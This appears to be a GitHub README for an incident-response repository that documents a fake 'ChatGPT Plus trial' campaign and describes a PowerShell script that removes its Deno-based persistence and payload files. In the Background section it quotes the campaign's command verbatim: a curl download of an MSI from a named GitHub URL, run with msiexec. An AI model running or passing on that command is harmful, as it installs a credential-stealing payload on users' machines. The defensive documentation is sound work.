# Remove-Payload-chatgptfree
#chatgptfree #chatgptplusfree #chatgpt #chatgptplus #freechatgpt #ai #payload #malware #stealer

# Remove-Observed-Payload

Targeted Windows cleanup and incident documentation repository for a Deno/JavaScript payload delivered through a fraudulent “ChatGPT trial / Plus generator” campaign.

---

## Background

This repository documents the investigation and remediation of a suspicious MSI installer distributed through:

* a YouTube video:
  [YouTube video source](https://www.youtube.com/watch?v=r0OpCjwpHt4&t=1s&utm_source=chatgpt.com)

* and a GitHub raw README:
  [GitHub raw README source](https://raw.githubusercontent.com/ai-gen-profi/chatgpt-trial-gen/main/Readme.txt?utm_source=chatgpt.com)

The campaign instructed users to execute the following command:

```cmd
curl -Lo %temp%\s.msi https://raw.githubusercontent.com/ai-gen-profi/chatgpt-trial-gen/main/gpt.msi && msiexec /i %temp%\s.msi
```

The README claimed the installer would help users obtain a “free ChatGPT Plus trial” using Deno and an API-based workflow.

Observed behavior after execution included:

* browser sessions unexpectedly closing
* repeated account logouts (Gmail, GitHub)
* Deno runtime installation
* scheduled task persistence
* Registry Run persistence
* execution of obfuscated JavaScript payloads

---

# Repository Contents

| File                             | Description                                     |
| -------------------------------- | ----------------------------------------------- |
| `Remove-Observed-Payload-v3.ps1` | Targeted PowerShell cleanup script              |
| `Incident-Report-v3.md`          | Incident summary and forensic notes             |
| `README.md`                      | Repository documentation and usage instructions |

---

# Scope

This repository is **not** a generic antivirus or malware removal framework.

The PowerShell script is intentionally scoped to the Indicators of Compromise (IOCs) observed during this incident, including:

* Scheduled Task: `\ReaderUpdate`
* Registry Run value: `563ca209`
* Payload: `563ca209.js`
* Dropper directory: `yy.exe`
* Deno runtime execution
* MSI artifact: `s.msi`
* Associated payload files such as:

  * `Flu_X64.exe`
  * `GPUlib.dll`
  * `HardwareLib.dll`

---

# Observed Persistence Chain

The investigation identified a persistence chain involving:

```text
Registry Run Key
 └── conhost.exe --headless
      └── deno.exe -A
           └── 563ca209.js
```

And:

```text
Scheduled Task
 └── \ReaderUpdate
      └── Flu_X64.exe
```

The payload appeared to leverage:

* Deno runtime execution
* JavaScript-based loader behavior
* scheduled task persistence
* registry autoruns
* browser/session targeting behavior

---

# Requirements

* Windows 10 or Windows 11
* PowerShell 5.1 or later
* Administrator privileges
* Microsoft Defender enabled for follow-up scanning

---

# Recommended Workflow

1. Read the incident report first.
2. Open PowerShell as Administrator.
3. Run the script in audit mode first.
4. Review generated logs and CSV outputs.
5. Run remediation mode if findings match the observed indicators.
6. Rotate passwords and revoke active sessions afterward.

---

# Usage

## 1. Audit-Only Mode

This mode performs detection and logging without making changes.

```powershell
Set-ExecutionPolicy -Scope Process Bypass -Force
.\Remove-Observed-Payload-v3.ps1
```

---

## 2. Remediation Mode

This mode removes the observed persistence and payload artifacts.

```powershell
Set-ExecutionPolicy -Scope Process Bypass -Force
.\Remove-Observed-Payload-v3.ps1 -Remediate
```

---

## 3. Optional Deno Removal

If the observed Deno installation should also be removed:

```powershell
.\Remove-Observed-Payload-v3.ps1 -Remediate -RemoveDenoProduct
```

---

## 4. Optional Browser Artifact Scan

To additionally inspect browser-related locations:

```powershell
.\Remove-Observed-Payload-v3.ps1 -Remediate -ScanBrowserArtifacts
```

---

# What the Script Does

When executed with `-Remediate`, the script:

* stops IOC-matching processes
* removes the scheduled task `\ReaderUpdate`
* removes Registry Run persistence
* checks HKCU/HKLM Run keys
* checks Startup folders
* hashes known payload artifacts before deletion
* removes:

  * `563ca209.js`
  * `yy.exe`
  * `%TEMP%\s.msi`
  * associated payload files
* attempts MSI cleanup for product `gpt`
* optionally removes Deno via WinGet
* scans browser profile locations
* generates transcripts and CSV audit logs

---

# Output Files

The script stores logs under:

```text
%ProgramData%\IR-Cleanup-<timestamp>\
```

Generated files include:

| File                     | Purpose                             |
| ------------------------ | ----------------------------------- |
| `cleanup.transcript.txt` | PowerShell transcript               |
| `actions.csv`            | Cleanup action log                  |
| `hashes.csv`             | SHA256 hashes of observed artifacts |
| `cleanup-report.md`      | Generated cleanup summary           |

---

# Post-Cleanup Recommendations

Because the payload executed with:

```text
deno.exe -A
```

(full filesystem/network access),

the following actions are strongly recommended:

* change passwords for:

  * email accounts
  * GitHub
  * password managers
  * financial accounts
* revoke active sessions
* revoke OAuth tokens
* review browser extensions
* review NativeMessagingHosts
* run Microsoft Defender Full Scan or Offline Scan
* review additional local Windows profiles if present

---

# Risk Notes

At the time of analysis:

* active scheduled-task persistence was removed
* Registry Run persistence was removed
* active `deno.exe` payload execution stopped
* no immediate process respawn was observed

However, residual risk may still include:

* credential/session theft
* browser extension persistence
* secondary payload delivery
* token/session exposure before cleanup

---

# Acknowledgements

This repository and remediation workflow were developed with assistance from:

* [OpenAI ChatGPT](https://chat.openai.com?utm_source=chatgpt.com)

  * IOC analysis
  * PowerShell remediation scripting
  * persistence hunting
  * report drafting

* [Anthropic Claude](https://claude.ai?utm_source=chatgpt.com)

  * script review
  * bug identification
  * coverage improvements
  * remediation validation

The final script and documentation were manually reviewed and refined before publication.

---

# Disclaimer

This repository is provided for:

* incident response
* malware cleanup
* forensic documentation
* educational DFIR purposes

Use at your own risk.

Review the script before execution on any system other than the originally investigated host.
